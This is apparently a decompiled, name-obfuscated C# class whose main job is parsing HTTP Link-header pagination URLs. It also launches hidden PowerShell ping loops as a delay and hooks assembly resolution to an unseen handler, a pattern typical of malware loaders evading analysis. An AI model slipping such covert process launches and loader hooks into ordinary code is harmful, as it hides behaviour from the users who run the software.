using System;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace Hgyvpkz;

internal sealed class f
{
	private string m_a;

	private string m_b;

	private string m_c;

	private string m_d;

	public string a()
	{
		return this.m_a;
	}

	public void a(string a)
	{
		this.m_a = a;
	}

	public string b()
	{
		return this.m_b;
	}

	public void b(string a)
	{
		this.m_b = a;
	}

	public string c()
	{
		return this.m_c;
	}

	public void c(string a)
	{
		this.m_c = a;
	}

	public string d()
	{
		return this.m_d;
	}

	public void d(string a)
	{
		this.m_d = a;
	}

	public static void a()
	{
		for (int k = 0; k < 10; k++)
		{
			f.b();
		}
		AppDomain.CurrentDomain.AssemblyResolve += Hgyvpkz.b.a;
	}

	private static void b()
	{
		Process? process = Process.Start(new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = "Test-Connection -ComputerName google.com",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden
		});
		process!.WaitForExit(2000);
		process!.Kill();
	}

	public static f a(string a)
	{
		f f2 = null;
		if (!string.IsNullOrWhiteSpace(a))
		{
			string[] array = a.Split(new char[1] { ',' });
			if (array != null && Hgyvpkz.a.a(array))
			{
				f2 = new f();
				string[] array2 = array;
				foreach (string input in array2)
				{
					Match match = Regex.Match(input, "(?<=rel=\").+?(?=\")", RegexOptions.IgnoreCase);
					Match match2 = Regex.Match(input, "(?<=<).+?(?=>)", RegexOptions.IgnoreCase);
					if (match.Success && match2.Success)
					{
						string text = match.Value.ToUpper();
						string value = match2.Value;
						switch (text)
						{
						case "LAST":
							f2.d(value);
							break;
						case "NEXT":
							f2.c(value);
							break;
						case "PREV":
							f2.b(value);
							break;
						case "FIRST":
							f2.a(value);
							break;
						}
					}
				}
			}
		}
		return f2;
	}
}
